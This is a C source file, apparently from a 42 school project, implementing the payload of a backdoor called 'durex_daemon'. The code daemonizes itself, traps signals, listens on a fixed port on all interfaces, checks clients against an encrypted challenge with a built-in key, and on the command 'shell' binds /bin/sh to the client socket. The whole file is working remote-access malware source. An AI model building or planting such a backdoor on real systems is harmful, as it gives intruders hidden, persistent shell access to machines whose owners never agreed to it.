/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@42.student.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/05/25 14:55:42 by eparisot          #+#    #+#             */
/*   Updated: 2021/05/25 14:55:42 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/payload.h"

void handle_signals(int signum)
{
	if (signum == SIGCHLD || signum == SIGHUP)
		return ;
	(DEBUG) ? printf("error %d signal in payload\n", signum) : 0;
	exit(EXIT_FAILURE);
}

int daemonize(char* name, char* path, char* infile, char *outfile, char *errfile)
{
	pid_t pid;

	if (!path) {path="/";}
    if (!name) {name="durex_daemon";}
	if (!infile) {infile="/dev/null";}
    if (!outfile) {outfile="/dev/null";}
    if (!errfile) {errfile="/dev/null";}
    // Fork off the parent process
    pid = fork();
    // An error occurred
    if (pid < 0)
	{
        exit(EXIT_FAILURE);
	}
	// Success: Let the parent terminate
    if (pid > 0)
    {
	    exit(EXIT_SUCCESS);
	}
	// On success: The child process becomes session leader
    if (setsid() < 0)
    {
	    exit(EXIT_FAILURE);
	}
	// Catch, ignore and handle signals
	signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    // Implement a real signal handler
	struct sigaction action;
	memset(&action, 0, sizeof(action));
	action.sa_handler = handle_signals;
	for (int i = 0; i < 32; ++i)
    	sigaction(i, &action, 0);
	// Fork off for the second time
    pid = fork();
    // An error occurred
    if (pid < 0)
    {
	    exit(EXIT_FAILURE);
	}
	// Success: Let the parent terminate
    if (pid > 0)
    {
	    exit(EXIT_SUCCESS);
	}
	// Set new file permissions
    umask(0);
    // Change the working directory to the root directory
    if (chdir("/"))
	{
		exit(EXIT_FAILURE);
	}
	//Close all open file descriptors
    for(int fd=sysconf(_SC_OPEN_MAX); fd > 0; --fd)
    {
        close(fd);
    }
    //reopen stdin, stdout, stderr
    stdin = fopen(infile,"r");   //fd=0
    stdout = fopen(outfile,"w+");  //fd=1
    stderr = fopen(errfile,"w+");  //fd=2
	return 0;
}

int setup_server(env_t *env, struct sockaddr_in *server_address)
{
	int opt = 1;

	for (int i = 0; i < env->nb_clients; ++i)
	{
		env->clients_sockets[i] = 0;
	}
	// set the server address
    server_address->sin_family = AF_INET;
    server_address->sin_addr.s_addr = INADDR_ANY;
    server_address->sin_port = htons(REMOTE_PORT);
	// open socket
    env->master_sd = socket(AF_INET, SOCK_STREAM, 0);
	if (env->master_sd < 0)
	{
		(DEBUG) ? printf("error opening socket\n") : 0;
		return -1;
	}
	// set socket options
	if (setsockopt(env->master_sd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
    {
        (DEBUG) ? printf("error setting socket options\n") : 0;
		close(env->master_sd);
		return -1;
    }
	// bind socket to if
    if (bind(env->master_sd, (const struct sockaddr *)server_address, sizeof(*server_address)))
	{
		(DEBUG) ? printf("error binding socket\n") : 0;
		close(env->master_sd);
		return -1;
	}
	// listen for connexions
	if (listen(env->master_sd, env->nb_clients) < 0)
	{
		(DEBUG) ? printf("error listening socket\n") : 0;
		close(env->master_sd);
		return -1;
	}
	return 0;
}

int generate_handshake(char *key)
{
	int fd = 0;

	memset(key, 0, 17);
	if ((fd = open("/dev/urandom", O_RDONLY)) < 0)
		return -1;
	if (read(fd, key, 16) < 0)
		return -1;
	key[16] = 0;
	return 0;
}

int handle_connexions(env_t *env)
{
	struct sockaddr_in client_address;
	socklen_t client_addr_size = sizeof(struct sockaddr_in);
	int new_socket = 0;
    char buffer[1025];
	char conn_refused_msg[] = "Connexion refused\n";
	char welcome_msg[] = "Welcome !\nCommands:\n\tshell:\tspawn a shell\n";
	char handshake[17];

	memset(buffer, 0, 1025);
	if (FD_ISSET(env->master_sd, &env->readfds))  
	{
		if ((new_socket = accept(env->master_sd, (struct sockaddr *)&client_address, &client_addr_size)) < 0)  
		{
			(DEBUG) ? printf("error accepting connexion\n") : 0;
			(DEBUG) ? printf("%s\n", strerror(errno)) : 0;
			return -1;
		}
		//add new socket to array of sockets 
		int found = 0;
		int i = 0;
		for (i = 0; i < env->nb_clients; i++)  
		{
			//if position is empty 
			if(env->clients_sockets[i] == 0)  
			{  
				env->clients_sockets[i] = new_socket;
				found = 1;
				break;  
			}
		}
		if (found == 0)
			return 1;
		//inform user of socket number - used in send and receive commands 
		//printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
		if (generate_handshake(handshake))
		{
			(DEBUG) ? printf("error generating random handshake\n") : 0;
			close(env->master_sd);
			return -1;
		}
		send(env->clients_sockets[i], handshake, 17, 0);
		// check password
		if (read(env->clients_sockets[i], buffer, 1025) < 0)
		{
			(DEBUG) ? printf("error reading socket content\n") : 0;
			close(env->master_sd);
			return -1;
		}
		buffer[16] = 0;
		if (rabbit(handshake, env->key))
		{
			(DEBUG) ? printf("error encrypting handshake\n") : 0;
			close(env->master_sd);
			return -1;
		}
		if (strcmp(buffer, handshake))
		{
			send(env->clients_sockets[i], conn_refused_msg, strlen(conn_refused_msg), 0);
			close(env->clients_sockets[i]);
			env->clients_sockets[i] = 0;
			sleep(3);
			return 1;
		}
		send(env->clients_sockets[i], welcome_msg, strlen(welcome_msg), 0);
	}
	return 0;
}

void *wait_child(void *args)
{
	int pid = ((wait_args_t *)args)->pid;
	int *clients_sockets = ((wait_args_t *)args)->clients_sockets;

	waitpid(pid, 0, 0);
	*clients_sockets = -*clients_sockets;
	free(args);
	return NULL;
}

int spawn_shell(int *clients_sockets)
{
	int shell_pid = 0;

	shell_pid = fork();
	if (shell_pid < 0)
	{
		(DEBUG) ? printf("error fork failed\n") : 0;
		exit(EXIT_FAILURE);
	}
	if (shell_pid == 0)
	{
		// Start child
		dup2(*clients_sockets, 0);
		dup2(*clients_sockets, 1);
		dup2(*clients_sockets, 2);
		*clients_sockets = -*clients_sockets;
		char * const argv[] = {"/bin/sh", NULL};
		execve("/bin/sh", argv, NULL);
		// execve only return in case of trouble 
		exit(EXIT_FAILURE);
	}
	send(*clients_sockets, "Shell:\n", strlen("Shell:\n"), 0);

	pthread_t thread;
	wait_args_t *args;
	if ((args = malloc(sizeof(wait_args_t))) == NULL)
	{
		(DEBUG) ? printf("error malloc failed\n") : 0;
		exit(EXIT_FAILURE);
	}
	args->pid = shell_pid;
	args->clients_sockets = clients_sockets;
	if (pthread_create(&thread, NULL, wait_child, args) < 0)
	{
		(DEBUG) ? printf("error pthread_create failed\n") : 0;
		exit(EXIT_FAILURE);
	}
	return 0;
}

int handle_commands(env_t *env)
{
	int sd = 0;
	int valread;
	char buffer[1025] = {0};
	
	for (int i = 0; i < env->nb_clients; i++)  
	{
		sd = env->clients_sockets[i];  
		if (FD_ISSET(sd, &env->readfds))  
		{
			//Check if it was for closing , and also read the incoming message 
			if ((valread = read(sd, buffer, 1024)) == 0)
			{
				//Somebody disconnected, close the socket and mark as 0 in list for reuse 
				close(sd);
				env->clients_sockets[i] = 0;
			}
			//Handle commands
			else
			{
				//set the string terminating NULL byte on the end of the data read 
				buffer[valread] = 0;
				// handle shell command
				if (strcmp(buffer, "shell\n") == 0)
				{
					int ret = spawn_shell(&env->clients_sockets[i]);
					if (ret)
					{
						break;
					}
					else if (ret == 0)
					{
						continue;
					}
				}
				else
				{
					send(sd, "command not found\n", strlen("command not found\n"), 0); 
				}
			}
		}
	}
	return 0;
}

int server_loop(env_t *env)
{
	int activity;
	int max_sd = 0; 
	
	while (1)
	{
		//clear the socket set 
		FD_ZERO(&env->readfds);
		//add master socket to set 
		FD_SET(env->master_sd, &env->readfds);  
		max_sd = env->master_sd;
		//add child sockets to set 
		for (int i = 0; i < env->nb_clients; i++)  
		{                  
			//if valid socket descriptor then add to read list 
			if (env->clients_sockets[i] > 0)  
			{
				FD_SET(env->clients_sockets[i], &env->readfds);  
			}		
			//highest file descriptor number, need it for the select function 
			if (env->clients_sockets[i] > max_sd)  
			{	
				max_sd = env->clients_sockets[i];  
			}
		}
		//wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely
		activity = select(max_sd + 1, &env->readfds, NULL, NULL, NULL);
		if ((activity < 0) && (errno != EINTR))
		{
			continue;
		}
		//If something happened on the master socket, then its an incoming connection 
		int ret = handle_connexions(env);
		if (ret == 1)
		{
			continue;
		}
		else if (ret)
		{
			return -1;
		}
		//else its some IO operation on some other socket
		if (handle_commands(env))
		{
			return -1;
		}
	}
	return 0;
}

void* create_shared_memory(size_t size) {
  // Our memory buffer will be readable and writable:
  int protection = PROT_READ | PROT_WRITE;

  // The buffer will be shared (meaning other processes can access it), but
  // anonymous (meaning third-party processes cannot obtain an address for it),
  // so only this process and its children will be able to use it:
  int visibility = MAP_SHARED | MAP_ANONYMOUS;

  // The remaining parameters to `mmap()` are not important for this use case,
  // but the manpage for `mmap` explains their purpose.
  return mmap(NULL, size, protection, visibility, -1, 0);
}

int r_shell(env_t *env)
{
	struct sockaddr_in server_address;
	if ((env->clients_sockets = malloc(env->nb_clients * sizeof(int))) == NULL)
	{
		return -1;
	}
	env->clients_sockets = create_shared_memory(env->nb_clients * sizeof(int));

	if (setup_server(env, &server_address))
	{
		return -1;
	}
	if (server_loop(env))
	{
		return -1;
	}
	munmap(env->clients_sockets, env->nb_clients * sizeof(int));
	return 0;
}

void clear_env(env_t *env)
{
	if (env->clients_sockets)
	{
		free(env->clients_sockets);
	}
	free(env);
}

int main(void)
{
	env_t *env;

	if ((env = malloc(sizeof(env_t))) == NULL)
	{
		(DEBUG) ? printf("error malloc failed\n") : 0;
		return EXIT_FAILURE;
	}
	memset(env->key, 0, 17);
	memcpy(env->key, KEY, 17);
	env->nb_clients = MAX_CLIENTS;

	if (daemonize("durex_daemon", "/", "/dev/fd/0", "/dev/fd/1", "/dev/fd/2"))
	{
		(DEBUG) ? printf("error failed to run daemon\n") : 0;
		return EXIT_FAILURE;
	}
	while (1)
	{
		if (r_shell(env))
		{
			break;
		}
		sleep(1);
	}
	clear_env(env);
	return EXIT_SUCCESS;
}